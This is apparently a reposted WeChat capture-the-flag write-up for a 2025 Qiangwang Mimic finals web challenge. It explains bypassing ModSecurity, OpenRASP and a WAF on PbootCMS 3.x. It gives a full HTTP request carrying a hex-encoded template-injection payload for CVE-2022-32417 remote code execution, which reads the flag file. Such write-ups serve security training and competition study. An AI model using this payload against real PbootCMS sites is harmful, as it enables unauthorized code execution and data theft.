---
title: 2025强网拟态决赛唯一解 云网互联赛道-WEB层层加码
url: https://mp.weixin.qq.com/s/ttq3xS0NY62rpqf11hs9Ew
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:06:45.938350
---

# 2025强网拟态决赛唯一解 云网互联赛道-WEB层层加码

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hYTcBbYGXIcib2GhmyOy74VEjmGfWLWPqvlAP1Nr20FmFZC2shVeZtbKOXWYqlFzBydfyz5icJBOrJCTP14uzdMtcKTZib71o1nzoqASnFJO80/0?wx_fmt=jpeg)

# 2025强网拟态决赛唯一解 云网互联赛道-WEB层层加码

d2550自留地

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于ap0s
，作者ap0s

![](http://wx.qlogo.cn/mmhead/X6Ucic5kYIBPrvcibYvOBIPSvniaR6CT6XcV6wPZzntpT1iaH5jPBhkJAPlibZdyFxvqEFX7jj1QECNw/0)

**ap0s**
.

安全小白

## 云网互联赛道-WEB层层加码

利用前提： 采用了Web应用异构化架构设计，以及ModSecurity、OpenRASP、Waf的安全防护机制。

### web3.1

先从3.1开始看起 因为这个关卡没有异构，只需要绕过其他的三个安全机制即可

使用PbootCMS 3.x 版本 CVE-2022-32417 远程命令执行POC

可以通过hex编码对其进行绕过，然后此关卡需要使用无动作的函数 读取 如show\_source，highlight\_file等，即可获取flag

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hYTcBbYGXIcIpLOgMAIRzF3JS5Qxq34pSqEj5blnOltVtq2cuwSsz7TJKQcU8W5oONcgZJz4tc4RB2iaJPCJtWAHyOMuNOT9dPibTV3UaKziaQ/640?wx_fmt=jpeg&from=appmsg)

### web3.2

3.2新增了异构的安全机制，所以使用3.1是利用不通的 经过研究使用php反射可以获取完整函数名

```
ReflectionClass::export()
```

![](https://mmbiz.qpic.cn/mmbiz_png/hYTcBbYGXIdCMOiaicfqBB95KZVmI9VfmhGxMt73WoxONPOPBfNkMxQ0TPOcRLasicNhKIoPicFY9mSAf14icQBrfxlxLKO26Q5wvcicOg8MXKldw/640?wx_fmt=png&from=appmsg)

既然现在知道了问题，所以获取所需要用到的函数，然后在3.1的基础上进行修改即可

```
GET /?xa=}{pboot{user:password}:if((("\x63\x6f\x72\x65\x5c\x62\x61\x73\x69\x63\x5c\x52\x65\x73\x70\x6f\x6e\x73\x65\x3a\x3a\x6a\x73\x6f\x6e\x55\x37\x6e\x43\x66\x75\x49\x54\x79\x34\x70\x72\x4a\x41\x72\x32\x36")("1",("\x70\x61\x72\x73\x65\x5f\x69\x6e\x66\x6f\x5f\x74\x70\x6c\x55\x37\x6e\x43\x66\x75\x49\x54\x79\x34\x70\x72\x4a\x41\x72\x32\x36")("\x2f\x66\x6c\x61\x67","\x68\x61\x72\x64\x65\x72"))));//)}xxx{/pboot{user:password}:if} HTTP/1.1
Host: 172.29.60.28
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: lg=cn; PbootSystem=
Connection: keep-alive
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/hYTcBbYGXIfg5KAFsHia6w9ic5vh8jkQRBQSXiaLXws8ibcgCKYvJibgMkib8iaHQ27CIC3vIQdKjtqp1vNpkxWVJB4IJtNSE4MnhzqgiabzsRODic94/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hYTcBbYGXIezVKbdsUl5XSwGT9ukfq8lXKWR71ic7aCLJcSvIqicjm8T6BmyPG6IHEpjNwicdKOxggx2GKgxNoyqDACIZ1SyX0kH39W3pX3IgI/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/bDFc8pniaibZKTFqPUQWQjMbNdRd2mI4JRfas2IfsTUxFIIWgc0OX83ZbktQcl6glsTKibuhpSa0rgrt19N1ibMLHg/0?wx_fmt=png)

d2550自留地

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/bDFc8pniaibZKTFqPUQWQjMbNdRd2mI4JRfas2IfsTUxFIIWgc0OX83ZbktQcl6glsTKibuhpSa0rgrt19N1ibMLHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过